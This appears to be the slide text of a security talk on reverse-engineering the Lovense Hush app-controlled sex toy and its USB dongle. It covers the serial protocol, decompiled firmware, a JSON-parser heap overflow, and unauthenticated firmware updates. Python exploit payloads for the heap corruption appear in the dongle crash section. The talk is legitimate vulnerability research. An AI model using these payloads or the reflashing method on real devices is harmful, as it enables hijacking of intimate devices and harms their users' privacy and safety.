Adventures in buttplug
penetration (testing)
@smealum
Intro to teledildidonics
Word of the day
teledildonics /Ààtel…ôdild≈ç√§niks/
From the Greek t√™le, meaning ‚Äúafar‚Äù, and the English dildo, meaning ‚Äúdildo‚Äù.
Use scenario 1: solo play
Use scenario 2: local co-op
Use scenario 3: remote co-op
Internet
Use scenario 3b: remote paid co-op
Internet
Compromise scenario 1: local hijack
Internet
Compromise scenario 2: remote hijack
Internet
Compromise scenario 3: reverse remote hijack
The Lovense Hush
The Lovense Hush
‚Ä¢ ‚ÄúThe World‚Äôs First Teledildonic Butt Plug‚Äù
‚Ä¢ It‚Äôs a buttplug
‚Ä¢ You can control it from your phone
‚Ä¢ iOS or Android
‚Ä¢ You can control it from your computer
‚Ä¢ Windows or Mac OS
‚Ä¢ App includes social features
‚Ä¢ Chat (text, pictures, video)
‚Ä¢ Share toy control with friends or strangers
The Lovense ecosystem
Lovense Remote App
Toys
USB dongle
BLE
Internet
USB
Lovense compromise map
Compromise
scenario #1
Compromise
scenario #2
Compromise
scenario #3
BLE
Internet
USB
Where to start?
?
?
No code/binaries
available
No code/binaries
available
Binaries available
for download
Binaries available
for download
Lovense remote
Requires a lovense account
Long distance play mode
Local play control mode
Runs on both Windows and 
Mac OS, so of course it‚Äôs 
electron-based
=> We just need to read some 
slightly obfuscated JavaScript
Lovense remote: the dongle protocol
...
var t = new l.SerialPort(i.comName, {
baudRate: e.dongleBaudRate.baudRate,
dataBits: 8,
parity: "none",
stopBits: 1,
flowControl: !1
});
...
Lovense Remote: app.js
‚Ä¢ The app is all written in JavaScript
‚Ä¢ The code is somewhat obfuscated, 
but field names are still present
‚Ä¢ Throw it in a beautifier and you 
can get a good idea of what‚Äôs going 
on with little effort‚Ä¶
‚Ä¢ For example: search for ‚Äúdongle‚Äù, 
and find the following
=> app and dongle talk over serial
‚Ä¢ We can easily sniff serial traffic
‚Ä¢ Two types of commands
‚Ä¢ Simple: ‚ÄúDeviceType;‚Äù
‚Ä¢ Complex: encoded as JSON
‚Ä¢ Same with dongle responses
‚Ä¢ After DeviceType, they‚Äôre all JSON
‚Ä¢ Responses are read 32 bytes at a time
=> Do the dongle and toy‚Äôs firmware 
include a JSON parser? ü§î
Messages sent to dongle
Messages received back from dongle
Lovense remote: the dongle protocol
‚Ä¢ Easy to replicate basic app 
functionality in python
‚Ä¢ Convenient for testing
‚Ä¢ Very simple protocol
Lovense remote: the dongle protocol
# open port
p = serial.Serial("COM3", 115200, timeout=1, bytesize=serial.EIGHTBITS,
parity=serial.PARITY_NONE, stopbits=serial.STOPBITS_ONE)
# get device type
p.write(b"DeviceType;\r\n")
deviceType = p.readline()
# search for toys (we already know our toy's MAC though)
p.write(b'{"type":"toy","func":"search"}\r\n‚Äô); print(p.readline());
p.write(b'{"type":"toy","func":"statuss"}\r\n‚Äô); print(p.readline());
p.write(b'{"type":"toy","func":"stopSearch"}\r\n‚Äô); print(p.readline());
# connect to toy
p.write(b'{"type":"toy","func":"connect","eager":1,"id":"899208080A0A"}\r\n')
print(p.readline())
# try various commands
p.write(b'{"type":"toy","func":"command","id":"899208080A0A","cmd":"DeviceType;"}\r\n')
print(p.readline())
p.write(b'{"type":"toy","func":"command","id":"899208080A0A","cmd":"Battery;"}\r\n')
print(p.readline())
p.write(b'{"type":"toy","func":"command","id":"899208080A0A","cmd":"Vibrate:20;"}\r\n')
print(p.readline())
Lovense remote: the dongle protocol
...
this.updateUrl = _configServer.LOGIN_SERVICE_URL + 
"/app/getUpdate/dfu?v="
this.filename = "src/update/dongle.zip"
this.exePath = "src\\update\\nrfutil.exe"
...
t.downloadFile(this.updateUrl + e, t.filename, ...)
... 
dfu: "DFU;",
oldDongleDFU: {
type: "usb",
cmd: "DFU"
}
Lovense Remote: app.js
‚Ä¢ JSON means parsing code which 
means firmware bugs
‚Ä¢ But finding bugs without the code 
is annoying‚Ä¶
‚Ä¢ Search app.js for ‚Äúupdate‚Äù‚Ä¶
‚Ä¢ ‚Ä¶and find what we want ‚ò∫
‚Ä¢ DFU = Device Firmware Update
‚Ä¢ URL gives us a binary to analyze
Lovense USB dongle firmware
d1071.zip from Lovense
‚Ä¢ The file we get is a zip
‚Ä¢ Two binary blob
‚Ä¢ One JSON file
‚Ä¢ None of it is encrypted
‚Ä¢ Nothing that looks like a base 
address or anything in metadata, 
mostly just looks like versioning
‚Ä¢ Big blob looks like thumb-mode 
ARM, so IDA to the rescue‚Ä¶
Metadata
Firmware blob
void processLatestCommand()
{
if ( receivedCommand_ == 1 )
{
if ( !processSimpleCommands_(latestCommand_) )
{
processComplexCommands_(latestCommand_);
}
}
}
bool processSimpleCommands_(char *a1)
{
if ( memcmp(a1, "DFU;", 4u) )
{
if ( !memcmp(a1, "RESET;", 6u) )
{
sendHostMessage_("OK;");
SYSRESETREQ();
}
if ( memcmp(a1, "DeviceType;", 0xBu) )
{
if ( memcmp(a1, "GetBatch;", 9u) ) return 0;
sendHostMessage_("%02X%02X%02X;\n",
batch0, batch1, batch2, batch3);
}else{
sendHostMessage_("%s:%s%s:%02X%02X%02X%02X%02X%02X;\n",
"D", "1", "05", deviceMac0, deviceMac1, deviceMac2,
deviceMac3, deviceMac4, deviceMac5);
}
}else{
sendHostMessage_("OK;");
initiateDfu_();
}
return 1;
}
void processComplexCommands_(char *cmd)
{
jsonNode_s* node = parseJsonFromString_(cmd);
if ( !node )
{
sendHostError("402");
return;
}
attribute_type = getJsonAttributeByName(node, "type");
...
}
Lovense USB dongle firmware: DFU command & JSON parser
Lovense USB dongle firmware: JSON parser
‚Ä¢ Don‚Äôt know if parser is open-source or 
in-house
‚Ä¢ What I do know is it‚Äôs buggy ‚ò∫
‚Ä¢ parseJsonString
‚Ä¢ Parses member strings
‚Ä¢ Handles escape characters
‚Ä¢ Copies strings into the heap
‚Ä¢ Can turn this into an arbitrary write
‚Ä¢ Corrupting heap metadata lets us place 
the next string at an arbitrary location
‚Ä¢ No ASLR => we‚Äôre good to go
while ( 1 )
{
curcar_strlen = *cursor_strlen;
if ( curcar_strlen == '‚Äú‚Äô ) break;
if ( !*cursor_strlen ) break;
++string_length;
if ( !string_length ) break;
++cursor_strlen;
if ( curcar_strlen == '\\‚Äô ) ++cursor_strlen;
}
string_buffer = malloc(string_length + 1);
...
while ( 1 )
{
if ( *cursor == '"' || !*cursor ) break;
if ( *cursor == '\\‚Äô )
{
if ( cursor[1] == 'u‚Äô )
{
sscanf(&cursor[2], "%4x", &unicode_val);
cursor += 4;
...
}
}
...
Assumes escapes 
only skip one 
character‚Ä¶
‚Ä¶but they can 
actually skip way 
more than one
‚Ä¢ This is great, but we still don‚Äôt know what 
hardware the dongle is running
‚Ä¢ We know no ASLR, no stack cookies, but maybe 
there‚Äôs DEP/XN?
‚Ä¢ Based on NRF51822 SoC
‚Ä¢ Cortex-M0, 256KB flash, 16KB ram
‚Ä¢ No DEP
‚Ä¢ Includes BLE-capable radio
‚Ä¢ Very popular for low power BLE devices
‚Ä¢ Can be debugged over SWD if not factory disabled
Lovense USB dongle: hardware
Exposed SWD test points
Debugging the dongle
‚Ä¢ This is great, but we still don‚Äôt know what 
hardware the dongle is running
‚Ä¢ We know no ASLR, no stack cookies, but maybe 
there‚Äôs DEP/XN?
‚Ä¢ Based on NRF51822 SoC
‚Ä¢ Cortex-M0, 256KB flash, 16KB ram
‚Ä¢ No DEP
‚Ä¢ Includes BLE-capable radio
‚Ä¢ Very popular for low power BLE devices
‚Ä¢ Can be debugged over SWD if not factory disabled
Lovense USB dongle: hardware
Debugging the dongle
Lovense USB dongle crash
# use heap-based buffer overflow to corrupt heap metadata...
bugdata = b"\u" + bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
0x78, 0x46, 0x5c, 0x00, 0x20])
bugdata = b'{"type":"toy","test":"' + bugdata + b'"}\r\n'
p.write(bugdata)
print(p.readline())
bugdata = b"\u" + bytes([0x00, 0x01, 0x02, 0x03, 0x04,
0x5c, 0x00, 0x5c, 0x00])
bugdata = b'{"type":"toy","test":"' + bugdata + b'"}\r\n'
p.write(bugdata)
print(p.readline())
# send string data that will be allocated at 0x20004678 and smash the stack
bugdata = b"a" * 0x300
bugdata = b'{"type":"toy","test":"' + bugdata + b'"}\r\n'
p.write(bugdata)
‚Ä¢ Unfortunately, toy doesn‚Äôt respond to JSON 
‚Ä¢ It does share simple commands with dongle
‚Ä¢ DeviceType; is sent to both dongle and toy
‚Ä¢ What about DFU;?
‚Ä¢ Definitely has an effect
‚Ä¢ Causes the dongle to become unresponsive‚Ä¶
‚Ä¢ ‚Ä¶and to disconnect from UART ü§î
Lovense USB dongle: DFU
‚Ä¢ We already know dongle DFU is possible
‚Ä¢ The app does it when you plug in a new dongle
‚Ä¢ ‚Ä¶we downloaded a DFU package from their server
‚Ä¢ But what kind of authentication does it use?
‚Ä¢ Let‚Äôs check the metadata for a signature‚Ä¶
‚Ä¢ The only thing even close to authentication is‚Ä¶ 
a CRC16
Lovense USB dongle: DFU
{
"manifest": {
"application": {
"bin_file": "main.bin",
"dat_file": "main.dat",
"init_packet_data": {
"application_version": 4294967295,
"device_revision": 65535,
"device_type": 65535,
"firmware_crc16": 8520,
"softdevice_req": [
65534
]
}
},
"dfu_version": 0.5
}
}
manifest.json
Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D
00000000  FF FF FF FF FF FF FF FF 01 00 FE FF 48 21
main.dat
main.bin
‚Ä¢ Can we just modify main.bin, recalculate 
its CRC16 and flash it using the program 
included in Lovense Remote?
‚Ä¢ Yes
‚Ä¢ Since ‚ÄúDFU;‚Äù affects the plug too, 
maybe we can reflash its firmware too
‚Ä¢ But we don‚Äôt have a base firmware image‚Ä¶ 
so need to take a look under the hood
Lovense USB dongle: DFU
main.bin
Serial port sniffer
BLE
Internet
USB
Lovense compromise map
Computer can compromise dongle over USB serial
‚Ä¢ The Hush is based off the NRF528322
‚Ä¢ Cortex M4, 512KB flash, 64KB ram
‚Ä¢ Basically supercharged NRF58122
‚Ä¢ We can easily locate things that weren‚Äôt 
on the dongle‚Ä¶
‚Ä¢ ‚Ä¶and things that were
‚Ä¢ The Hush has working SWD test points
‚Ä¢ Thanks to this, we can just dump the 
firmware over SWD
Lovense Hush: hardware
Power
Motor
Antenna
Charger port
SWD test points